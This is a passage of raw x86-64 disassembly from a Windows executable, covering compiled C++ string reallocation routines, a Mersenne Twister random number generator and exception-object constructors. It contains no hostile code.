   14000676a:	48 8b 0b             	mov    (%rbx),%rcx
   14000676d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140006774:	00 
   140006775:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000677c:	72 18                	jb     0x140006796
   14000677e:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140006782:	48 83 c2 27          	add    $0x27,%rdx
   140006786:	48 2b c8             	sub    %rax,%rcx
   140006789:	48 83 e9 08          	sub    $0x8,%rcx
   14000678d:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140006791:	77 30                	ja     0x1400067c3
   140006793:	48 8b c8             	mov    %rax,%rcx
   140006796:	e8 45 07 00 00       	call   0x140006ee0
   14000679b:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   14000679f:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1400067a6:	00 
   1400067a7:	66 89 33             	mov    %si,(%rbx)
   1400067aa:	48 83 c3 20          	add    $0x20,%rbx
   1400067ae:	48 3b df             	cmp    %rdi,%rbx
   1400067b1:	75 ad                	jne    0x140006760
   1400067b3:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400067b8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400067bd:	48 83 c4 30          	add    $0x30,%rsp
   1400067c1:	5f                   	pop    %rdi
   1400067c2:	c3                   	ret
   1400067c3:	45 33 c9             	xor    %r9d,%r9d
   1400067c6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400067cb:	45 33 c0             	xor    %r8d,%r8d
   1400067ce:	33 d2                	xor    %edx,%edx
   1400067d0:	33 c9                	xor    %ecx,%ecx
   1400067d2:	ff 15 f8 2c 00 00    	call   *0x2cf8(%rip)        # 0x1400094d0
   1400067d8:	cc                   	int3
   1400067d9:	cc                   	int3
   1400067da:	cc                   	int3
   1400067db:	cc                   	int3
   1400067dc:	cc                   	int3
   1400067dd:	cc                   	int3
   1400067de:	cc                   	int3
   1400067df:	cc                   	int3
   1400067e0:	40 53                	rex push %rbx
   1400067e2:	55                   	push   %rbp
   1400067e3:	56                   	push   %rsi
   1400067e4:	41 57                	push   %r15
   1400067e6:	48 83 ec 38          	sub    $0x38,%rsp
   1400067ea:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   1400067ee:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400067f5:	ff ff 7f 
   1400067f8:	48 8b c3             	mov    %rbx,%rax
   1400067fb:	45 0f b6 f9          	movzbl %r9b,%r15d
   1400067ff:	48 2b c5             	sub    %rbp,%rax
   140006802:	48 8b f1             	mov    %rcx,%rsi
   140006805:	48 83 f8 01          	cmp    $0x1,%rax
   140006809:	0f 82 39 01 00 00    	jb     0x140006948
   14000680f:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140006814:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   140006819:	4c 8d 65 01          	lea    0x1(%rbp),%r12
   14000681d:	49 8b d4             	mov    %r12,%rdx
   140006820:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140006825:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140006829:	48 83 ca 0f          	or     $0xf,%rdx
   14000682d:	48 3b d3             	cmp    %rbx,%rdx
   140006830:	77 44                	ja     0x140006876
   140006832:	49 8b ce             	mov    %r14,%rcx
   140006835:	48 8b c3             	mov    %rbx,%rax
   140006838:	48 d1 e9             	shr    $1,%rcx
   14000683b:	48 2b c1             	sub    %rcx,%rax
   14000683e:	4c 3b f0             	cmp    %rax,%r14
   140006841:	77 33                	ja     0x140006876
   140006843:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006847:	48 8b da             	mov    %rdx,%rbx
   14000684a:	48 3b d0             	cmp    %rax,%rdx
   14000684d:	48 0f 42 d8          	cmovb  %rax,%rbx
   140006851:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006855:	48 85 c9             	test   %rcx,%rcx
   140006858:	75 04                	jne    0x14000685e
   14000685a:	33 ff                	xor    %edi,%edi
   14000685c:	eb 49                	jmp    0x1400068a7
   14000685e:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006865:	72 38                	jb     0x14000689f
   140006867:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000686b:	48 3b c1             	cmp    %rcx,%rax
   14000686e:	0f 86 da 00 00 00    	jbe    0x14000694e
   140006874:	eb 0e                	jmp    0x140006884
   140006876:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000687d:	00 00 80 
   140006880:	48 83 c0 27          	add    $0x27,%rax
   140006884:	48 8b c8             	mov    %rax,%rcx
   140006887:	e8 5c 06 00 00       	call   0x140006ee8
   14000688c:	48 85 c0             	test   %rax,%rax
   14000688f:	74 6d                	je     0x1400068fe
   140006891:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006895:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006899:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000689d:	eb 08                	jmp    0x1400068a7
   14000689f:	e8 44 06 00 00       	call   0x140006ee8
   1400068a4:	48 8b f8             	mov    %rax,%rdi
   1400068a7:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   1400068ab:	4c 8b c5             	mov    %rbp,%r8
   1400068ae:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400068b2:	48 8b cf             	mov    %rdi,%rcx
   1400068b5:	49 83 fe 0f          	cmp    $0xf,%r14
   1400068b9:	76 5d                	jbe    0x140006918
   1400068bb:	48 8b 1e             	mov    (%rsi),%rbx
   1400068be:	48 8b d3             	mov    %rbx,%rdx
   1400068c1:	e8 85 16 00 00       	call   0x140007f4b
   1400068c6:	49 8d 56 01          	lea    0x1(%r14),%rdx
   1400068ca:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   1400068ce:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   1400068d3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400068da:	72 18                	jb     0x1400068f4
   1400068dc:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400068e0:	48 83 c2 27          	add    $0x27,%rdx
   1400068e4:	48 2b d8             	sub    %rax,%rbx
   1400068e7:	48 83 eb 08          	sub    $0x8,%rbx
   1400068eb:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400068ef:	77 0d                	ja     0x1400068fe
   1400068f1:	48 8b d8             	mov    %rax,%rbx
   1400068f4:	48 8b cb             	mov    %rbx,%rcx
   1400068f7:	e8 e4 05 00 00       	call   0x140006ee0
   1400068fc:	eb 2b                	jmp    0x140006929
   1400068fe:	45 33 c9             	xor    %r9d,%r9d
   140006901:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006908:	00 00 
   14000690a:	45 33 c0             	xor    %r8d,%r8d
   14000690d:	33 d2                	xor    %edx,%edx
   14000690f:	33 c9                	xor    %ecx,%ecx
   140006911:	ff 15 b9 2b 00 00    	call   *0x2bb9(%rip)        # 0x1400094d0
   140006917:	cc                   	int3
   140006918:	48 8b d6             	mov    %rsi,%rdx
   14000691b:	e8 2b 16 00 00       	call   0x140007f4b
   140006920:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   140006924:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   140006929:	48 89 3e             	mov    %rdi,(%rsi)
   14000692c:	48 8b c6             	mov    %rsi,%rax
   14000692f:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   140006934:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140006939:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   14000693e:	48 83 c4 38          	add    $0x38,%rsp
   140006942:	41 5f                	pop    %r15
   140006944:	5e                   	pop    %rsi
   140006945:	5d                   	pop    %rbp
   140006946:	5b                   	pop    %rbx
   140006947:	c3                   	ret
   140006948:	e8 63 aa ff ff       	call   0x1400013b0
   14000694d:	cc                   	int3
   14000694e:	e8 3d a9 ff ff       	call   0x140001290
   140006953:	cc                   	int3
   140006954:	cc                   	int3
   140006955:	cc                   	int3
   140006956:	cc                   	int3
   140006957:	cc                   	int3
   140006958:	cc                   	int3
   140006959:	cc                   	int3
   14000695a:	cc                   	int3
   14000695b:	cc                   	int3
   14000695c:	cc                   	int3
   14000695d:	cc                   	int3
   14000695e:	cc                   	int3
   14000695f:	cc                   	int3
   140006960:	48 8b 09             	mov    (%rcx),%rcx
   140006963:	48 85 c9             	test   %rcx,%rcx
   140006966:	0f 85 a4 f9 ff ff    	jne    0x140006310
   14000696c:	c3                   	ret
   14000696d:	cc                   	int3
   14000696e:	cc                   	int3
   14000696f:	cc                   	int3
   140006970:	40 53                	rex push %rbx
   140006972:	55                   	push   %rbp
   140006973:	56                   	push   %rsi
   140006974:	48 83 ec 40          	sub    $0x40,%rsp
   140006978:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000697c:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   140006983:	ff ff 7f 
   140006986:	48 8b c3             	mov    %rbx,%rax
   140006989:	48 8b f1             	mov    %rcx,%rsi
   14000698c:	48 2b c5             	sub    %rbp,%rax
   14000698f:	48 3b c2             	cmp    %rdx,%rax
   140006992:	0f 82 70 01 00 00    	jb     0x140006b08
   140006998:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000699d:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400069a2:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400069a6:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400069ab:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   1400069af:	49 8b d7             	mov    %r15,%rdx
   1400069b2:	48 83 ca 07          	or     $0x7,%rdx
   1400069b6:	48 3b d3             	cmp    %rbx,%rdx
   1400069b9:	77 3f                	ja     0x1400069fa
   1400069bb:	49 8b ce             	mov    %r14,%rcx
   1400069be:	48 8b c3             	mov    %rbx,%rax
   1400069c1:	48 d1 e9             	shr    $1,%rcx
   1400069c4:	48 2b c1             	sub    %rcx,%rax
   1400069c7:	4c 3b f0             	cmp    %rax,%r14
   1400069ca:	77 2e                	ja     0x1400069fa
   1400069cc:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   1400069d0:	48 8b da             	mov    %rdx,%rbx
   1400069d3:	48 3b d0             	cmp    %rax,%rdx
   1400069d6:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400069da:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400069e1:	ff ff 7f 
   1400069e4:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400069e8:	48 3b c8             	cmp    %rax,%rcx
   1400069eb:	0f 87 1d 01 00 00    	ja     0x140006b0e
   1400069f1:	48 03 c9             	add    %rcx,%rcx
   1400069f4:	75 12                	jne    0x140006a08
   1400069f6:	33 ff                	xor    %edi,%edi
   1400069f8:	eb 4b                	jmp    0x140006a45
   1400069fa:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006a01:	ff ff 7f 
   140006a04:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140006a08:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006a0f:	72 2c                	jb     0x140006a3d
   140006a11:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140006a15:	48 3b c1             	cmp    %rcx,%rax
   140006a18:	0f 86 f0 00 00 00    	jbe    0x140006b0e
   140006a1e:	48 8b c8             	mov    %rax,%rcx
   140006a21:	e8 c2 04 00 00       	call   0x140006ee8
   140006a26:	48 85 c0             	test   %rax,%rax
   140006a29:	0f 84 8f 00 00 00    	je     0x140006abe
   140006a2f:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006a33:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006a37:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140006a3b:	eb 08                	jmp    0x140006a45
   140006a3d:	e8 a6 04 00 00       	call   0x140006ee8
   140006a42:	48 8b f8             	mov    %rax,%rdi
   140006a45:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140006a4c:	00 
   140006a4d:	48 8d 2c 6d 02 00 00 	lea    0x2(,%rbp,2),%rbp
   140006a54:	00 
   140006a55:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140006a59:	48 8d 15 f0 31 00 00 	lea    0x31f0(%rip),%rdx        # 0x140009c50
   140006a60:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140006a64:	48 8b cf             	mov    %rdi,%rcx
   140006a67:	4c 8d 04 00          	lea    (%rax,%rax,1),%r8
   140006a6b:	4d 8d 3c 38          	lea    (%r8,%rdi,1),%r15
   140006a6f:	49 83 fe 07          	cmp    $0x7,%r14
   140006a73:	76 63                	jbe    0x140006ad8
   140006a75:	48 8b 1e             	mov    (%rsi),%rbx
   140006a78:	e8 ce 14 00 00       	call   0x140007f4b
   140006a7d:	4c 8b c5             	mov    %rbp,%r8
   140006a80:	48 8b d3             	mov    %rbx,%rdx
   140006a83:	49 8b cf             	mov    %r15,%rcx
   140006a86:	e8 c0 14 00 00       	call   0x140007f4b
   140006a8b:	4a 8d 14 75 02 00 00 	lea    0x2(,%r14,2),%rdx
   140006a92:	00 
   140006a93:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140006a9a:	72 18                	jb     0x140006ab4
   140006a9c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140006aa0:	48 83 c2 27          	add    $0x27,%rdx
   140006aa4:	48 2b d8             	sub    %rax,%rbx
   140006aa7:	48 83 eb 08          	sub    $0x8,%rbx
   140006aab:	48 83 fb 1f          	cmp    $0x1f,%rbx
   140006aaf:	77 0d                	ja     0x140006abe
   140006ab1:	48 8b d8             	mov    %rax,%rbx
   140006ab4:	48 8b cb             	mov    %rbx,%rcx
   140006ab7:	e8 24 04 00 00       	call   0x140006ee0
   140006abc:	eb 2d                	jmp    0x140006aeb
   140006abe:	45 33 c9             	xor    %r9d,%r9d
   140006ac1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006ac8:	00 00 
   140006aca:	45 33 c0             	xor    %r8d,%r8d
   140006acd:	33 d2                	xor    %edx,%edx
   140006acf:	33 c9                	xor    %ecx,%ecx
   140006ad1:	ff 15 f9 29 00 00    	call   *0x29f9(%rip)        # 0x1400094d0
   140006ad7:	cc                   	int3
   140006ad8:	e8 6e 14 00 00       	call   0x140007f4b
   140006add:	4c 8b c5             	mov    %rbp,%r8
   140006ae0:	48 8b d6             	mov    %rsi,%rdx
   140006ae3:	49 8b cf             	mov    %r15,%rcx
   140006ae6:	e8 60 14 00 00       	call   0x140007f4b
   140006aeb:	48 89 3e             	mov    %rdi,(%rsi)
   140006aee:	48 8b c6             	mov    %rsi,%rax
   140006af1:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140006af6:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140006afb:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140006b00:	48 83 c4 40          	add    $0x40,%rsp
   140006b04:	5e                   	pop    %rsi
   140006b05:	5d                   	pop    %rbp
   140006b06:	5b                   	pop    %rbx
   140006b07:	c3                   	ret
   140006b08:	e8 a3 a8 ff ff       	call   0x1400013b0
   140006b0d:	cc                   	int3
   140006b0e:	e8 7d a7 ff ff       	call   0x140001290
   140006b13:	cc                   	int3
   140006b14:	cc                   	int3
   140006b15:	cc                   	int3
   140006b16:	cc                   	int3
   140006b17:	cc                   	int3
   140006b18:	cc                   	int3
   140006b19:	cc                   	int3
   140006b1a:	cc                   	int3
   140006b1b:	cc                   	int3
   140006b1c:	cc                   	int3
   140006b1d:	cc                   	int3
   140006b1e:	cc                   	int3
   140006b1f:	cc                   	int3
   140006b20:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140006b24:	48 8b 09             	mov    (%rcx),%rcx
   140006b27:	e9 14 fc ff ff       	jmp    0x140006740
   140006b2c:	cc                   	int3
   140006b2d:	cc                   	int3
   140006b2e:	cc                   	int3
   140006b2f:	cc                   	int3
   140006b30:	8b 11                	mov    (%rcx),%edx
   140006b32:	41 ba 70 02 00 00    	mov    $0x270,%r10d
   140006b38:	4c 8b c9             	mov    %rcx,%r9
   140006b3b:	41 3b d2             	cmp    %r10d,%edx
   140006b3e:	75 51                	jne    0x140006b91
   140006b40:	4c 8d 41 08          	lea    0x8(%rcx),%r8
   140006b44:	0f 1f 40 00          	nopl   0x0(%rax)
   140006b48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140006b4f:	00 
   140006b50:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006b54:	41 33 10             	xor    (%r8),%edx
   140006b57:	4d 8d 40 04          	lea    0x4(%r8),%r8
   140006b5b:	0f ba f2 1f          	btr    $0x1f,%edx
   140006b5f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006b63:	8b c2                	mov    %edx,%eax
   140006b65:	24 01                	and    $0x1,%al
   140006b67:	f6 d8                	neg    %al
   140006b69:	1b c9                	sbb    %ecx,%ecx
   140006b6b:	d1 ea                	shr    $1,%edx
   140006b6d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006b73:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   140006b7a:	33 ca                	xor    %edx,%ecx
   140006b7c:	41 89 88 b8 09 00 00 	mov    %ecx,0x9b8(%r8)
   140006b83:	49 83 ea 01          	sub    $0x1,%r10
   140006b87:	75 c7                	jne    0x140006b50
   140006b89:	41 8b 11             	mov    (%r9),%edx
   140006b8c:	e9 e0 00 00 00       	jmp    0x140006c71
   140006b91:	81 fa e0 04 00 00    	cmp    $0x4e0,%edx
   140006b97:	0f 82 d4 00 00 00    	jb     0x140006c71
   140006b9d:	4c 8d 81 c8 09 00 00 	lea    0x9c8(%rcx),%r8
   140006ba4:	41 ba e3 00 00 00    	mov    $0xe3,%r10d
   140006baa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006bb0:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006bb4:	41 33 10             	xor    (%r8),%edx
   140006bb7:	4d 8d 40 04          	lea    0x4(%r8),%r8
   140006bbb:	0f ba f2 1f          	btr    $0x1f,%edx
   140006bbf:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006bc3:	8b c2                	mov    %edx,%eax
   140006bc5:	24 01                	and    $0x1,%al
   140006bc7:	f6 d8                	neg    %al
   140006bc9:	1b c9                	sbb    %ecx,%ecx
   140006bcb:	d1 ea                	shr    $1,%edx
   140006bcd:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006bd3:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   140006bda:	33 ca                	xor    %edx,%ecx
   140006bdc:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   140006be3:	49 83 ea 01          	sub    $0x1,%r10
   140006be7:	75 c7                	jne    0x140006bb0
   140006be9:	4d 8d 81 54 0d 00 00 	lea    0xd54(%r9),%r8
   140006bf0:	41 ba 8c 01 00 00    	mov    $0x18c,%r10d
   140006bf6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006bfd:	00 00 00 
   140006c00:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006c04:	41 33 10             	xor    (%r8),%edx
   140006c07:	4d 8d 40 04          	lea    0x4(%r8),%r8
   140006c0b:	0f ba f2 1f          	btr    $0x1f,%edx
   140006c0f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006c13:	8b c2                	mov    %edx,%eax
   140006c15:	24 01                	and    $0x1,%al
   140006c17:	f6 d8                	neg    %al
   140006c19:	1b c9                	sbb    %ecx,%ecx
   140006c1b:	d1 ea                	shr    $1,%edx
   140006c1d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006c23:	41 33 88 ac f2 ff ff 	xor    -0xd54(%r8),%ecx
   140006c2a:	33 ca                	xor    %edx,%ecx
   140006c2c:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   140006c33:	49 83 ea 01          	sub    $0x1,%r10
   140006c37:	75 c7                	jne    0x140006c00
   140006c39:	41 8b 81 80 13 00 00 	mov    0x1380(%r9),%eax
   140006c40:	8b d0                	mov    %eax,%edx
   140006c42:	41 33 51 04          	xor    0x4(%r9),%edx
   140006c46:	0f ba f2 1f          	btr    $0x1f,%edx
   140006c4a:	33 d0                	xor    %eax,%edx
   140006c4c:	8b c2                	mov    %edx,%eax
   140006c4e:	24 01                	and    $0x1,%al
   140006c50:	f6 d8                	neg    %al
   140006c52:	1b c9                	sbb    %ecx,%ecx
   140006c54:	d1 ea                	shr    $1,%edx
   140006c56:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006c5c:	33 ca                	xor    %edx,%ecx
   140006c5e:	41 33 89 34 06 00 00 	xor    0x634(%r9),%ecx
   140006c65:	33 d2                	xor    %edx,%edx
   140006c67:	41 89 89 c0 09 00 00 	mov    %ecx,0x9c0(%r9)
   140006c6e:	41 89 11             	mov    %edx,(%r9)
   140006c71:	8b c2                	mov    %edx,%eax
   140006c73:	41 8b 4c 81 04       	mov    0x4(%r9,%rax,4),%ecx
   140006c78:	8d 42 01             	lea    0x1(%rdx),%eax
   140006c7b:	41 89 01             	mov    %eax,(%r9)
   140006c7e:	8b c1                	mov    %ecx,%eax
   140006c80:	c1 e8 0b             	shr    $0xb,%eax
   140006c83:	41 23 81 84 13 00 00 	and    0x1384(%r9),%eax
   140006c8a:	33 c1                	xor    %ecx,%eax
   140006c8c:	8b d0                	mov    %eax,%edx
   140006c8e:	81 e2 ad 58 3a ff    	and    $0xff3a58ad,%edx
   140006c94:	c1 e2 07             	shl    $0x7,%edx
   140006c97:	33 d0                	xor    %eax,%edx
   140006c99:	8b ca                	mov    %edx,%ecx
   140006c9b:	81 e1 8c df ff ff    	and    $0xffffdf8c,%ecx
   140006ca1:	c1 e1 0f             	shl    $0xf,%ecx
   140006ca4:	33 ca                	xor    %edx,%ecx
   140006ca6:	8b c1                	mov    %ecx,%eax
   140006ca8:	c1 e8 12             	shr    $0x12,%eax
   140006cab:	33 c1                	xor    %ecx,%eax
   140006cad:	c3                   	ret
   140006cae:	cc                   	int3
   140006caf:	cc                   	int3
   140006cb0:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140006cb4:	48 2b c8             	sub    %rax,%rcx
   140006cb7:	e9 a4 f1 ff ff       	jmp    0x140005e60
   140006cbc:	ff 25 1e 25 00 00    	jmp    *0x251e(%rip)        # 0x1400091e0
   140006cc2:	cc                   	int3
   140006cc3:	cc                   	int3
   140006cc4:	40 53                	rex push %rbx
   140006cc6:	48 83 ec 20          	sub    $0x20,%rsp
   140006cca:	48 8b d9             	mov    %rcx,%rbx
   140006ccd:	b9 10 00 00 00       	mov    $0x10,%ecx
   140006cd2:	ff 15 a8 27 00 00    	call   *0x27a8(%rip)        # 0x140009480
   140006cd8:	48 8b d0             	mov    %rax,%rdx
   140006cdb:	48 85 c0             	test   %rax,%rax
   140006cde:	74 1b                	je     0x140006cfb
   140006ce0:	48 8b 05 99 76 00 00 	mov    0x7699(%rip),%rax        # 0x14000e380
   140006ce7:	48 89 02             	mov    %rax,(%rdx)
   140006cea:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   140006cee:	48 89 15 8b 76 00 00 	mov    %rdx,0x768b(%rip)        # 0x14000e380
   140006cf5:	48 83 c4 20          	add    $0x20,%rsp
   140006cf9:	5b                   	pop    %rbx
   140006cfa:	c3                   	ret
   140006cfb:	e8 11 00 00 00       	call   0x140006d11
   140006d00:	cc                   	int3
   140006d01:	cc                   	int3
   140006d02:	cc                   	int3
   140006d03:	cc                   	int3
   140006d04:	48 ff 25 fd 23 00 00 	rex.W jmp *0x23fd(%rip)        # 0x140009108
   140006d0b:	ff 25 97 24 00 00    	jmp    *0x2497(%rip)        # 0x1400091a8
   140006d11:	ff 25 61 24 00 00    	jmp    *0x2461(%rip)        # 0x140009178
   140006d17:	cc                   	int3
   140006d18:	cc                   	int3
   140006d19:	cc                   	int3
   140006d1a:	cc                   	int3
   140006d1b:	cc                   	int3
   140006d1c:	cc                   	int3
   140006d1d:	cc                   	int3
   140006d1e:	cc                   	int3
   140006d1f:	cc                   	int3
   140006d20:	48 8b 05 d9 72 00 00 	mov    0x72d9(%rip),%rax        # 0x14000e000
   140006d27:	33 d2                	xor    %edx,%edx
   140006d29:	48 ff 25 30 29 00 00 	rex.W jmp *0x2930(%rip)        # 0x140009660
   140006d30:	40 53                	rex push %rbx
   140006d32:	48 83 ec 20          	sub    $0x20,%rsp
   140006d36:	48 8b d9             	mov    %rcx,%rbx
   140006d39:	48 8d 05 b0 29 00 00 	lea    0x29b0(%rip),%rax        # 0x1400096f0
   140006d40:	48 89 01             	mov    %rax,(%rcx)
   140006d43:	8b 42 08             	mov    0x8(%rdx),%eax
   140006d46:	89 41 08             	mov    %eax,0x8(%rcx)
   140006d49:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006d4d:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140006d51:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   140006d58:	00 
   140006d59:	48 85 c9             	test   %rcx,%rcx
   140006d5c:	74 0d                	je     0x140006d6b
   140006d5e:	48 8b 01             	mov    (%rcx),%rax
   140006d61:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006d65:	ff 15 f5 28 00 00    	call   *0x28f5(%rip)        # 0x140009660
   140006d6b:	48 8b c3             	mov    %rbx,%rax
   140006d6e:	48 83 c4 20          	add    $0x20,%rsp
   140006d72:	5b                   	pop    %rbx
   140006d73:	c3                   	ret
   140006d74:	cc                   	int3
   140006d75:	cc                   	int3
   140006d76:	cc                   	int3
   140006d77:	cc                   	int3
   140006d78:	cc                   	int3
   140006d79:	cc                   	int3
   140006d7a:	cc                   	int3
   140006d7b:	cc                   	int3
   140006d7c:	cc                   	int3
   140006d7d:	cc                   	int3
   140006d7e:	cc                   	int3
   140006d7f:	cc                   	int3
   140006d80:	40 53                	rex push %rbx
   140006d82:	48 83 ec 20          	sub    $0x20,%rsp
   140006d86:	48 8b d9             	mov    %rcx,%rbx
   140006d89:	48 8d 05 60 29 00 00 	lea    0x2960(%rip),%rax        # 0x1400096f0
   140006d90:	48 89 01             	mov    %rax,(%rcx)
   140006d93:	89 51 08             	mov    %edx,0x8(%rcx)
   140006d96:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140006d9a:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140006da1:	00 
   140006da2:	4d 85 c0             	test   %r8,%r8
   140006da5:	74 15                	je     0x140006dbc
   140006da7:	45 84 c9             	test   %r9b,%r9b
   140006daa:	74 10                	je     0x140006dbc
   140006dac:	49 8b 00             	mov    (%r8),%rax
   140006daf:	49 8b c8             	mov    %r8,%rcx
   140006db2:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006db6:	ff 15 a4 28 00 00    	call   *0x28a4(%rip)        # 0x140009660
   140006dbc:	48 8b c3             	mov    %rbx,%rax
   140006dbf:	48 83 c4 20          	add    $0x20,%rsp
   140006dc3:	5b                   	pop    %rbx
   140006dc4:	c3                   	ret
   140006dc5:	cc                   	int3
   140006dc6:	cc                   	int3
   140006dc7:	cc                   	int3
   140006dc8:	cc                   	int3
   140006dc9:	cc                   	int3
   140006dca:	cc                   	int3
   140006dcb:	cc                   	int3
   140006dcc:	cc                   	int3
   140006dcd:	cc                   	int3
   140006dce:	cc                   	int3
   140006dcf:	cc                   	int3
   140006dd0:	40 53                	rex push %rbx
   140006dd2:	48 83 ec 20          	sub    $0x20,%rsp
   140006dd6:	48 8b d9             	mov    %rcx,%rbx
   140006dd9:	48 8d 05 10 29 00 00 	lea    0x2910(%rip),%rax        # 0x1400096f0
   140006de0:	48 89 01             	mov    %rax,(%rcx)
   140006de3:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140006de7:	48 85 c9             	test   %rcx,%rcx
   140006dea:	74 0d                	je     0x140006df9
   140006dec:	48 8b 01             	mov    (%rcx),%rax
   140006def:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006df3:	ff 15 67 28 00 00    	call   *0x2867(%rip)        # 0x140009660
   140006df9:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140006dfd:	48 85 c9             	test   %rcx,%rcx
   140006e00:	74 0c                	je     0x140006e0e
   140006e02:	48 83 c4 20          	add    $0x20,%rsp
   140006e06:	5b                   	pop    %rbx
   140006e07:	48 ff 25 da 22 00 00 	rex.W jmp *0x22da(%rip)        # 0x1400090e8
   140006e0e:	48 83 c4 20          	add    $0x20,%rsp
   140006e12:	5b                   	pop    %rbx
   140006e13:	c3                   	ret
   140006e14:	cc                   	int3
   140006e15:	cc                   	int3
   140006e16:	cc                   	int3
   140006e17:	cc                   	int3
   140006e18:	cc                   	int3
   140006e19:	cc                   	int3
   140006e1a:	cc                   	int3
   140006e1b:	cc                   	int3
   140006e1c:	cc                   	int3
   140006e1d:	cc                   	int3
   140006e1e:	cc                   	int3
   140006e1f:	cc                   	int3
   140006e20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006e25:	57                   	push   %rdi
   140006e26:	48 83 ec 20          	sub    $0x20,%rsp
   140006e2a:	8b fa                	mov    %edx,%edi
   140006e2c:	48 8b d9             	mov    %rcx,%rbx
